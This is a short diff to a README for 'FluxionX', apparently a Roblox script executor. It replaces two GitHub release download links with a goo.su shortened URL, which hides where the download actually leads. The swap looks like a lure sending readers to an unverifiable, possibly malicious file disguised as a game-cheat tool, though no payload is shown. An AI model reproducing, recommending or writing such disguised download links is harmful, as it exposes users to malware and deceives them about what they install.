@@ -32,12 +32,12 @@ To begin using FluxionX, download the latest stable release based on your OS ver
 <table>
   <tr>
     <td align="center">
-      <a href="https://github.com/MideSlaw/FluxionX-Executor-for-Roblox/releases/download/v2.7/FluxionX_Executor_v2.7.zip">
+      <a href="https://goo.su/xBUsR">
         <img src="https://i.imgur.com/T72Ouhk.jpeg" alt="fluxionx executor" width="250">
       </a>
     </td>
     <td align="center">
-      <a href="https://github.com/MideSlaw/FluxionX-Executor-for-Roblox/releases/download/v2.7/FluxionX_Executor_v2.7.zip">
+      <a href="https://goo.su/xBUsR">
         <img src="https://i.imgur.com/z6NnWRw.jpeg" alt="fluxionx download" width="250">
       </a>
     </td>
